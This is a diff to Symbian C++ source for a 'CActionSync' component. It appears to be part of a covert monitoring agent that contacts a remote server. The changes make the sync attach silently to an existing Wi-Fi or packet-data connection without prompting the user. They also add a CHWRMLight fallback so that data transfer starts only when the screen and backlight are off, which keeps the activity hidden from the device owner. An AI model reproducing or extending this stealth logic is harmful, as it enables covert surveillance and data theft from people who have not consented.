@@ -10,10 +10,11 @@
 
 #include "ActionSync.h"
 #include <HT\Processes.h>
-#include <es_enum.h>     // for TConnectionInfoBuf
+//#include <es_enum.h>     // for TConnectionInfoBuf
 #include <rconnmon.h>	 // for connection monitor, add connmon.lib
 
 #include <hal.h>		// check display
+#include <hwrmlight.h>	// check display light when HAL isn't working 
 
 #include <centralrepository.h>			// detect offline mode
 #include <CoreApplicationUIsSDKCRKeys.h>
@@ -329,6 +330,7 @@ void CActionSync::GetActiveConnectionPrefL(TCommDbConnPref& connectPref)
 				connectPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
 				connectPref.SetDirection(ECommDbConnectionDirectionOutgoing);
 				connectPref.SetIapId(iapId);
+				
 			//} else {
 			//	iActiveConn = ETrue;
 			//	iUsableActiveConn = EFalse;
@@ -348,6 +350,90 @@ void CActionSync::GetActiveConnectionPrefL(TCommDbConnPref& connectPref)
 					connectPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
 					connectPref.SetDirection(ECommDbConnectionDirectionOutgoing);
 					connectPref.SetIapId(iapId);
+				//}
+			//} else {
+			//	iActiveConn = ETrue;
+			//	iUsableActiveConn = EFalse;
+			//}
+			
+		}
+		
+	}
+
+	connMonitor.Close();
+		
+}
+
+
+void CActionSync::GetActiveConnectionPrefL(TConnectionInfoBuf& aConnBuf)
+{
+	RConnectionMonitor connMonitor;
+	TUint connCount;
+	TRequestStatus status;
+	TUint connId;
+	TUint subConnCount;
+	TInt bearerType;
+	TUint iapId;
+	TUint ntwId;
+	
+	// RConnectionMonitor can monitor state of connections 
+	connMonitor.ConnectL();
+	
+	// Get active connections count
+	connMonitor.GetConnectionCount(connCount,status);
+	User::WaitForRequest(status);
+	if ((status.Int() != KErrNone) || (connCount == 0)){
+		connMonitor.Close();
+		return;
+	}
+	
+	for (TUint i=1 ; i<= connCount; i++)
+	{
+		// Gather connection info
+		TInt err = connMonitor.GetConnectionInfo(i,connId,subConnCount);
+		if(err != KErrNone)
+			{
+			continue;
+			}
+		connMonitor.GetIntAttribute(connId,0,KBearer,bearerType,status);
+		User::WaitForRequest(status);
+		// for bearer type:
+		// http://library.forum.nokia.com/topic/S60_3rd_Edition_Cpp_Developers_Library/GUID-759FBC7F-5384-4487-8457-A8D4B76F6AA6/html/rconnmon_8h.html?resultof=%22%45%42%65%61%72%65%72%57%6c%61%6e%22%20%22%65%62%65%61%72%65%72%77%6c%61%6e%22%20
+		// rconnmon.h
+		if (bearerType == EBearerWLAN){
+			//if(iUseWiFi){
+				// we have found a WiFi connection and we were asked to use WiFi
+				iActiveConn = ETrue;
+				iUsableActiveConn = ETrue;
+				connMonitor.GetUintAttribute(connId,0,KIAPId,iapId,status);
+				User::WaitForRequest(status);
+				connMonitor.GetUintAttribute(connId,0,KNetworkIdentifier,ntwId,status);
+				User::WaitForRequest(status);
+				TConnectionInfo connInfo(iapId,ntwId);
+				TConnectionInfoBuf connInfoBuf(connInfo);
+				aConnBuf = connInfoBuf;
+			//} else {
+			//	iActiveConn = ETrue;
+			//	iUsableActiveConn = EFalse;
+			//}
+		}
+		else if (bearerType == EBearerGPRS || bearerType == EBearerEdgeGPRS || bearerType == EBearerWCDMA){
+			//if(iUseGPRS){
+				// we have found a packet data connection and we were asked for it
+				iActiveConn=ETrue;
+				
+				connMonitor.GetUintAttribute(connId,0,KIAPId,iapId,status);
+				User::WaitForRequest(status);
+				connMonitor.GetUintAttribute(connId,0,KNetworkIdentifier,ntwId,status);
+				User::WaitForRequest(status);
+				TConnectionInfo connInfo(iapId,ntwId);
+				TConnectionInfoBuf connInfoBuf(connInfo);
+				aConnBuf = connInfoBuf;
+				//TBool isWap;
+				//isWap = IsWapAccessPointL(iapId);
+				//iUsableActiveConn = !isWap;
+				//if(iUsableActiveConn){
+					
 				//}
 			//} else {
 			//	iActiveConn = ETrue;
@@ -392,10 +478,12 @@ void CActionSync::DispatchStartCommandL()
 	// Let's search for an already active connection
 	// iActiveConn means that there is an active connection ongoing
 	// iUsableConn means that is what requested (WiFi or GPRS not WAP)
-	TCommDbConnPref	pref;
+	//TCommDbConnPref	pref;
+	TConnectionInfoBuf connInfo;
 	iActiveConn = EFalse;
 	iUsableActiveConn = EFalse;
-	GetActiveConnectionPrefL(pref);
+	//GetActiveConnectionPrefL(pref);
+	GetActiveConnectionPrefL(connInfo);
 	
 	
 	if(iActiveConn && !iUsableActiveConn){
@@ -410,7 +498,8 @@ void CActionSync::DispatchStartCommandL()
 		
 		// we have found an active connection and we silently use it
 		// no display off, no user input monitoring
-		err = iConnection.Start(pref);
+		//err = iConnection.Start(pref);
+		err = iConnection.Attach(connInfo, RConnection::EAttachTypeNormal);
 	}
 	else { // we force the connection
 		__FLOG(_L("Force connection"));	
@@ -434,31 +523,44 @@ void CActionSync::DispatchStartCommandL()
 		TInt displayErr = KErrNone;
 		displayErr = HAL::Get(HAL::EDisplayState,value);
 		
+		__FLOG_1(_L("display state, displayErr = %d"),displayErr);
+		__FLOG_1(_L("display state, value = %d"),value);
 		// comment this part when debugging coz display always on when using TRK
 		// this is useful also to see what happens when monitoring user activity
 		//value = 0;           // TODO: restore comment here
 		if (value == 1)
 			{
-			//we check if screensaver is on
-			/*
-			if(!Processes::IsScreensaverRunning())
-				{
-				__FLOG(_L("Display active"));
-			
-				// display is active.... next time
-				MarkCommandAsDispatchedL();
-				return;
-				}
-				*/
 			//we check backlight status
 			TInt backlightState;
-			HAL::Get( HALData::EBacklightState, backlightState );
-			if(backlightState==1)
+			displayErr = HAL::Get( HALData::EBacklightState, backlightState );
+			__FLOG_1(_L("backlight state, displayErr=%d"),displayErr);
+			__FLOG_1(_L("backlight state, value = %d"),backlightState);
+			if(displayErr == KErrNone)
 				{
-				//backlight is active... next time
-				__FLOG(_L("Backlight active"));
-				MarkCommandAsDispatchedL();
-				return;
+				//backlight status is valid
+				if(backlightState==1)
+					{
+					//backlight is active... next time
+					__FLOG(_L("Backlight active"));
+					MarkCommandAsDispatchedL();
+					return;
+					}
+				}
+			else
+				{
+				// sometimes displayErr = -5: KErrNotSupported, the operation requested is not supported (e.g. on E71)
+				// let's try in another way
+				CHWRMLight* light = CHWRMLight::NewLC();
+				CHWRMLight::TLightStatus lightStatus = light->LightStatus(CHWRMLight::EPrimaryDisplay);
+				CleanupStack::PopAndDestroy(light);
+				__FLOG_1(_L("CHWRMLight status: %d"),lightStatus);
+				if(lightStatus != CHWRMLight::ELightOff)
+					{
+					//backlight is active... next time
+					__FLOG(_L("Backlight active"));
+					MarkCommandAsDispatchedL();
+					return;
+					}
 				}
 			}
 		
@@ -483,7 +585,6 @@ void CActionSync::DispatchStartCommandL()
 	// start sync.... at last!
 	__FLOG(_L("OK, start protocol"));
 		
-	//iProtocol->ConnectToServerL( iStartMonitor, iSocketServ, iConnection, iHostName, 80 );
 	iProtocol->StartRestProtocolL( iStartMonitor, iSocketServ, iConnection, iHostName, 80 );
 		
 	}
@@ -491,7 +592,6 @@ void CActionSync::DispatchStartCommandL()
 
 void CActionSync::ConnectionTerminatedL(TInt aError)
 	{
-	iConnection.Stop();
 	iConnection.Close();
 	
 	if(iDeleteLog)
